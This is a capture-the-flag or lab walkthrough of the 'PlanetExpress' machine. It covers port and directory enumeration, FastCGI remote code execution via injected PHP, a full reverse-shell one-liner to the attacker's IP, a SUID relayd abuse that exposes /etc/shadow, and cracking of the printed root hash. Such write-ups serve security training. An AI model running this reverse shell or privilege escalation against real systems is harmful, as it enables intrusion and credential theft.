# PlanetExpress

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.183.205
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 22:27 +08
Nmap scan report for 192.168.183.205
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9000/tcp open  cslistener

Nmap done: 1 IP address (1 host up) scanned in 35.83 seconds
```

Did a detailed scan to enumerate port 80 and 9000 further:

```
$ sudo nmap -p 80,9000 -sC -sV -O --min-rate 4000 -Pn 192.168.183.205
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 22:31 +08
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: Pico CMS
|_http-title: PlanetExpress - Coming Soon !
9000/tcp open  cslistener?
```

Port 8000 was running Pico CMS, which does have some exploits.&#x20;

### Web Enum --> PHPInfo

Port 80 had a countdown:

<figure><img src="../../../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>

There isn't much on this page, so we can do a `gobuster` directory scan with the PHP extension since PicoCMS was being used:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.183.205/ -x php -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.183.205/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/07/09 22:35:49 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5176]
/content              (Status: 301) [Size: 320] [--> http://192.168.183.205/content/]
/themes               (Status: 301) [Size: 319] [--> http://192.168.183.205/themes/]
/assets               (Status: 301) [Size: 319] [--> http://192.168.183.205/assets/]
/plugins              (Status: 301) [Size: 320] [--> http://192.168.183.205/plugins/]
/vendor               (Status: 301) [Size: 319] [--> http://192.168.183.205/vendor/]
/config               (Status: 301) [Size: 319] [--> http://192.168.183.205/config/]
```

Using the PicoCMS Github repository, we can view more about these directories.&#x20;

{% embed url="https://github.com/picocms/Pico/tree/master" %}

Viewing the `config.yml` file shows that this is indeed running PicoCMS:

```
$ curl http://192.168.183.205/config/config.yml
##
# Basic
#
site_title: PlanetExpress
base_url: ~

rewrite_url: ~
debug: true
timezone: ~
locale: ~

##
# Theme
<TRUNCATED>
## 
# Self developed plugin for PlanetExpress
#
#PicoTest:
#  enabled: true
```

There's also a custom plugin developed for this website, and we can visit that at `plugins/PicoTest.php` based on the Github repo. This would show us the PHPInfo of the site:

<figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

Here, we can find that `/var/www/html/planetexpress` is the document root. Also, we can find a lot of disabled functions:

<figure><img src="../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

### FastCGI --> RCE

There wasn't much else on the webpage for us to test, however there was still port 9000. Googling it revealed that it was running FastCGI:

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi" %}

There are RCE exploits for this service [here](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75). The script given allows us to inject PHP code into the service to be run. However, there are a lot of functions that are disabled based on `PicoTest.php`. I checked the functions against all functions that are able to execute system commands via PHP, and `passthru` was not disabled.

Using `passthru` and the document root directory allows us to get RCE:

<figure><img src="../../../.gitbook/assets/image (1215).png" alt=""><figcaption></figcaption></figure>

We can then get a reverse shell via the `mkfifo` one-liner.&#x20;

{% code overflow="wrap" %}
```
$ python2 exploit.py -c '<?php passthru("bash -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.218 80 > /tmp/f\""); ?>' 192.168.183.205 /var/www/html/planetexpress/plugins/PicoTest.php
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1232).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Relayd SUID --> Shadw Hash

I searched for SUID binaries and found one that stood out:

```
$ find / -perm -u=s -type f 2>/dev/null
<TRUNCATED>
/usr/sbin/relayd
<TRUNCATED>
```

We can check the help menu for this :

```
www-data@planetexpress:/home/astro$ /usr/sbin/relayd --help
Usage: relayd [options] [actions]
Actions:
  default action      start daemon
  -h                  show this help message
  -v                  show version info
  -k                  kill running daemon
  -s                  get running status
  -U                  hup (reload configs)
  -a [service]        add service for relay
  -r [service]        remove service for relay
  -i                  get real client ip
  -b [up|down]        broadcast the DS boot state
  -R                  reopen the log file
Options:
  -C [file]           read config from file
  -d                  enable debug mode. will not run in background
  -P [file]           set pid file for daemon
  -g [ip]             remote source ip
  -n [port]           remote source port
```

The option that stood out the most to me was the `-C` flag, because it allows us to read from files. I attempted to read the `/etc/shadow` file:

```
www-data@planetexpress:/tmp$ /usr/sbin/relayd -C /etc/shadow
[ERR] 2023-07-09 10:53:48 config.cpp:1539 write
[ERR] 2023-07-09 10:53:48 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2023-07-09 10:53:48 config.cpp:1189 bad json format [/etc/shadow]
[ERR] 2023-07-09 10:53:48 invalid config file

www-data@planetexpress:/tmp$ ls -la /etc/shadow
-rw-r--r-- 1 root shadow 940 Jan 10  2022 /etc/shadow
```

This made the file readable by all. We can then grab the `root` hash:

{% code overflow="wrap" %}
```
www-data@planetexpress:/tmp$ cat /etc/shadow
root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7:::
```
{% endcode %}

We just need to put this hash and the entry for `root` in `/etc/passwd` into another file, then run `unshadow` to convert it to a crackable hash.

{% code overflow="wrap" %}
```
$ cat hash  
root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7:::
$ cat passwd       
root:x:0:0:root:/root:/bin/bash
$ unshadow passwd hash
root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:0:0:root:/root:/bin/bash
```
{% endcode %}

Then, we can crack it in `john` (or in my case, just show because I cracked it before):

```
$ john --show root_hash                                     
root:neverwant2saygoodbye:0:0:root:/root:/bin/bash

1 password hash cracked, 0 left
```

We can then `ssh` in as `root`:

<figure><img src="../../../.gitbook/assets/image (1567).png" alt=""><figcaption></figcaption></figure>

Rooted!
